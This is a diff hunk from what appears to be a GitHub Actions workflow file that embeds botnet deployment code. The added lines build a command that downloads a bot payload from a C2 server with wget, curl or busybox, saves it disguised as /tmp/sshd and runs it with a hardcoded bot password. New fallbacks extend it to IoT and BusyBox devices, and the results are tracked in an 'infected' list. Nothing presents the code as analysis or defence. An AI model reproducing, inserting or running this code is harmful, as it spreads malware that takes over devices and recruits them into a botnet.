@@ -80,9 +80,12 @@ jobs:
           ]
 
           DEPLOY = (
-              f"wget -q http://{C2}:{PPORT}/bot.py -O /tmp/sshd 2>/dev/null || "
-              f"curl -s http://{C2}:{PPORT}/bot.py -o /tmp/sshd 2>/dev/null; "
-              f"python3 /tmp/sshd {C2} {CPORT} enibot2024 &"
+              # Try Python first, fallback to pure shell (for IoT/BusyBox devices)
+              f"(wget -q http://{C2}:{PPORT}/bot.py -O /tmp/sshd && python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(curl -s http://{C2}:{PPORT}/bot.py -o /tmp/sshd && python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && busybox sh /tmp/sshd {C2} {CPORT} enibot2024 &)"
           )
 
           infected = []
